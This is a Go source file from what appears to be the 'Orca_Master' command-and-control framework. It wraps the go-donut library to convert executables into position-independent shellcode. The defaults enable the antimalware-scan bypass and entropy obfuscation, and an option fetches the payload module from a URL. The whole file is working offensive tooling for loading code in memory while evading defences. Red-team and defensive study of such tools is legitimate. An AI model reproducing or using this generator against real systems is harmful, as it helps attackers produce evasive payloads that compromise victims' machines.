package shellcode

import (
	"Orca_Master/define/colorcode"
	"github.com/Binject/go-donut/donut"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
)

func PE2ShellCode(srcFile, dstFile, params *string) {
	moduleName := new(string)
	url := new(string)
	archStr := new(string)
	oepString := new(string)
	className := new(string)
	appDomain := new(string)
	method := new(string)
	runtime := new(string)
	entropy := new(int)
	bypass := new(int)
	format := new(int)
	action := new(int)
	zFlag := new(int)
	wFlag := new(bool)
	tFlag := new(bool)
	verbose := new(bool)
	*entropy = 3
	*archStr = "x84"
	*bypass = 3
	*format = 1
	*action = 1
	*zFlag = 1
	donutGen(moduleName, url, archStr, dstFile, oepString, className, appDomain, method, params, runtime, srcFile, entropy, bypass, format, action, zFlag, wFlag, tFlag, verbose)

}

func donutGen(moduleName, url, archStr, dstFile, oepString, className, appDomain, method, params, runtime, srcFile *string, entropy, bypass, format, action, zFlag *int, wFlag, tFlag, verbose *bool) {
	var err error
	oep := uint64(0)
	if *oepString != "" {
		oep, err = strconv.ParseUint(*oepString, 16, 64)
		if err != nil {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "Invalid OEP: "+err.Error())
			return
		}
	}

	var donutArch donut.DonutArch
	switch strings.ToLower(*archStr) {
	case "x32", "386":
		donutArch = donut.X32
	case "x64", "amd64":
		donutArch = donut.X64
	case "x84":
		donutArch = donut.X84
	default:
		colorcode.PrintMessage(colorcode.SIGN_ERROR, "Unknown architecture provided")
		return
	}

	config := new(donut.DonutConfig)
	config.Arch = donutArch
	config.Entropy = uint32(*entropy)
	config.OEP = oep

	if *url == "" {
		config.InstType = donut.DONUT_INSTANCE_PIC
	} else {
		config.InstType = donut.DONUT_INSTANCE_URL
	}

	config.Parameters = *params
	config.Runtime = *runtime
	config.URL = *url
	config.Class = *className
	config.Method = *method
	config.Domain = *appDomain
	config.Bypass = *bypass
	config.ModuleName = *moduleName
	config.Compress = uint32(*zFlag)
	config.Format = uint32(*format)
	config.Verbose = *verbose

	if *tFlag {
		config.Thread = 1
	}
	if *wFlag { // convert command line to unicode? only applies to unmanaged DLL function
		config.Unicode = 1
	}
	config.ExitOpt = uint32(*action)

	if *srcFile == "" {
		if *url == "" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "No source URL or file provided")
			return
		}
		payload, err := donut.ShellcodeFromURL(*url, config)
		if err == nil {
			err = ioutil.WriteFile(*dstFile, payload.Bytes(), 0644)
		}
	} else {
		payload, err := donut.ShellcodeFromFile(*srcFile, config)
		if err == nil {
			f, err := os.Create(*dstFile)
			if err != nil {
				log.Fatal(err)
			}
			defer f.Close()
			if _, err = payload.WriteTo(f); err != nil {
				log.Fatal(err)
			}
		}
	}
	if err != nil {
		log.Println(err)
	} else {
		colorcode.PrintMessage(colorcode.SIGN_SUCCESS, "the shellcode stub was successfully generated!")
	}
}
